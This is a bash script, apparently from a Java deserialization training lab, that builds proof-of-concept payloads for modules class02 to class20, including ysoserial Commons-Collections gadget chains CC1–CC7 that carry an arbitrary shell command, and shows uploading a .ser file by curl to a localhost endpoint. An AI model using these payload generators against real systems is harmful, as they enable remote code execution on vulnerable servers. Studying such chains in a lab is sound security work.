#!/bin/bash
# ============================================================
# 一键生成所有模块的 POC payload (Maven 项目版)
# 用法: cd poc && bash gen_all.sh [command]
# 默认命令: id
# ============================================================
set -euo pipefail
CMD="${1:-id}"
GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$SCRIPT_DIR"

echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}  生成所有模块 POC Payload (Maven)${NC}"
echo -e "${GREEN}  命令: ${CMD}${NC}"
echo -e "${GREEN}=============================================${NC}"

# 检查 Maven
if ! command -v mvn &>/dev/null; then
    echo "❌ 未找到 mvn 命令，请安装 Maven 或使用 IDEA 运行"
    exit 1
fi

# 先编译
echo -e "\n${YELLOW}[编译] mvn compile ...${NC}"
mvn clean compile -q

# 定义运行函数
run_gen() {
    local cls=$1
    echo -e "\n${YELLOW}[$cls] 生成中...${NC}"
    mvn exec:java -Dexec.mainClass="$cls.GenPayload" -q 2>/dev/null
    echo "  ✅ ${cls}.ser"
}

# class02-13: 自定义 Java payload
run_gen class02
run_gen class03
run_gen class04
run_gen class07
run_gen class08
run_gen class09
run_gen class10
run_gen class11
run_gen class12
run_gen class13

# class14-20: ysoserial chains (Docker 内生成)
echo -e "\n${YELLOW}[class14] CC1 链 (Docker)...${NC}"
bash ysoserial/class14-cc1/gen.sh "$CMD" 2>/dev/null || echo "  ⚠️  Docker 不可用，跳过"

echo -e "\n${YELLOW}[class15] CC2 链 (Docker)...${NC}"
bash ysoserial/class15-cc2/gen.sh "$CMD" 2>/dev/null || echo "  ⚠️  跳过"

echo -e "\n${YELLOW}[class16] CC3 链 (Docker)...${NC}"
bash ysoserial/class16-cc3/gen.sh "$CMD" 2>/dev/null || echo "  ⚠️  跳过"

echo -e "\n${YELLOW}[class17] CC4 链 (Docker)...${NC}"
bash ysoserial/class17-cc4/gen.sh "$CMD" 2>/dev/null || echo "  ⚠️  跳过"

echo -e "\n${YELLOW}[class18] CC5 链 (Docker)...${NC}"
bash ysoserial/class18-cc5/gen.sh "$CMD" 2>/dev/null || echo "  ⚠️  跳过"

echo -e "\n${YELLOW}[class19] CC6 链 (Docker)...${NC}"
bash ysoserial/class19-cc6/gen.sh "$CMD" 2>/dev/null || echo "  ⚠️  跳过"

echo -e "\n${YELLOW}[class20] CC7 链 (Docker)...${NC}"
bash ysoserial/class20-cc7/gen.sh "$CMD" 2>/dev/null || echo "  ⚠️  跳过"

echo -e "\n${GREEN}=============================================${NC}"
echo -e "${GREEN}  ✅ 生成完成！${NC}"
echo -e "${GREEN}=============================================${NC}"
echo ""
echo "上传方法:"
echo "  curl -X POST -F \"uploadFile=@class02.ser\" http://localhost:81/class02/upload"
